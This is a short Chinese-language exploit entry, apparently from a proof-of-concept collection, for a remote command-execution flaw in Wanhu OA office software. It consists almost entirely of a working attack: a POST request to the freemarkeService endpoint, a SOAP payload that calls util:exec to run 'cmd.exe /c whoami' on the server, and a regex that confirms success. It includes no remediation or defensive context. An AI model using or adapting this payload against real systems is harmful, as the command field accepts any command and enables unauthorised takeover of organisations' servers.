# 万户OA命令执行

万户OA ｜ 命令执行 ｜ —
- **请求**：`POST /defaultroot/services/./././freemarkeService HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
<soapenv:Header/>
<soapenv:Body>
<util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
<cmd xsi:type="soapenc:string">c:\windows\system32\cmd.exe /c whoami</cmd>
</arguments>
</util:exec>
</soapenv:Body>
</soapenv:Envelope>
```
- **响应特征**：200 ^(?=.*?命令)(?=.*?version).*?$